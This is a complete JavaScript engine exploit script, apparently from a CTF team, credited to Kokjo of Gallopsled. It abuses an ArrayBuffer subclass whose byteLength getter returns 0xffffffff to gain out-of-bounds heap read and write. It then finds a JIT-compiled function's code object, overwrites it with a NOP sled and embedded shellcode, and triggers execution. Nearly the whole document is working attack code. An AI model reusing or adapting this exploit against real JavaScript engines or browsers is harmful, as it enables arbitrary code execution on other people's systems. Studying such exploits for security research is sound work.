//Exploit by Kokjo from Gallopsled

var exploit = {};
exploit.run = function (){
    this.createRW();
    this.findPtr();
    this.createFunc();
    this.placeCode();
    this.trigger();
}
exploit.createRW = function (){
    class Foo extends ArrayBuffer {
        constructor(len) {
            super(len);
        };
        get byteLength (){
            return 0xffffffff;
        };
    }
    print("[+] Creating ArrayBuffer");
    this.size = 0x20;
    this.arr = new Foo(this.size);
    this.rw32 = new Uint32Array(this.arr, 0, 0x3fffffff);
    var rw8 = new Uint8Array(this.arr, 0, 0x3fffffff);
    for(i=0; i<this.size; i++) rw8[i] = 0x41;
}
exploit.calc = function(addr){
    off = (addr - this.base) >> 2;
    if(off < 0) off+=0x40000000;
    return off;
}
exploit.read32 = function(addr){
    return this.rw32[this.calc(addr)];
}
exploit.write32 = function(addr, val){
    this.rw32[this.calc(addr)] = val;
}
exploit.findPtr = function (){
    var rw = this.rw32;
    var heapptr = this.rw32[0x40000000 - 8];
    print("[+] Heapptr is at " + heapptr);
    var range = 0x8000;
    for(var i = range; i > -range; i--){
        var off = i;
        if(off < 0) off += 0x40000000;
        var diff = heapptr - rw[off+1];
        if(diff/4 == off + 8){
            this.base = rw[off+1] + 8*4;
            print("[+] ArrayBuffer base address found " + this.base);
            var ptr1 = this.read32(this.base-0x20+4);
            this.arraybufptr = this.read32(ptr1+4*10)-1;
            return;
        }
    }
    print("[-] Could not find ArrayBuffer");
}
exploit.createFunc = function (){
    this.func = function(a){while(a);};
    this.func(0);
    this.list = [this.func, 0x31337, 0x13371337];
    var ptr = this.arraybufptr-0x8000;
    print("[+] Searching for function object");
    while(true){
        if(this.read32(ptr+0) != 0 && this.read32(ptr+4) == 0x31337*2 && this.read32(ptr+8) == 0x13371337*2){
            this.funcptr = this.read32(ptr)-1;
            print("[+] Function object found " + this.funcptr);
            this.codeptr = this.read32(this.funcptr + 28);
            print("[+] Code object found " +this.codeptr);
            break;
        }
        ptr += 4;
    }
}
exploit.shellcode = [
    2338642737, 2139828347, 478120716,  2332575627,
    1066082423, 856456832,  3347706485, 2335995907,
    3254876247, 18905739,   2346551751, 3321999156,
    1128169797, 1969317234, 142508530,  1936024431,
    2055989621, 1724317988, 2339318923, 3338738810,
    4239359115, 3649685249, 3797155761, 1633904893,
    3800654700, 1397969490, 1397969747, 3623834450];

exploit.placeCode = function (){
    print("[+] Writing shellcode to code object");
    this.write32(this.codeptr+64, 0x90909090);
    for(i=0; i < this.shellcode.length; i++){
        this.write32(this.codeptr+64+4+i*4, this.shellcode[i]);
    }
}
exploit.trigger = function (){
    print("[+] Triggering!");
    this.func(1);
}

exploit.run();
